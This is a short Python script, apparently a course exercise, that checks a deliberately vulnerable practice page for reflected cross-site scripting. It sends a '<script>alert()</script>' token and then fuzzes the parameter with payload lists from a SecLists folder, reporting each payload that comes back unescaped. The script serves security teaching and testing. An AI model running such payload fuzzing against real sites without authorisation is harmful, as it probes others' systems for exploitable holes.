import requests
import os, glob

link = "http://www.cs.tufts.edu/comp/120/hackme.php?token=<script>alert()</script>"
page_response = requests.get(link)
if "<script>" in page_response.text:
    print("Vulnerability Detected!")

path = input("Enter SecList path:")

for filename in glob.glob(os.path.join(path, '*.txt')):
    with open(filename, 'r') as file:
        for line in file:
            new_url = 'http://www.cs.tufts.edu/comp/120/hackme.php?token=' + line 
            page_response = requests.get(new_url)
            if "<script>" in page_response.text:
                #   print("Openning File: ", filename)
                print("Vulnerability Detected: ", line)


    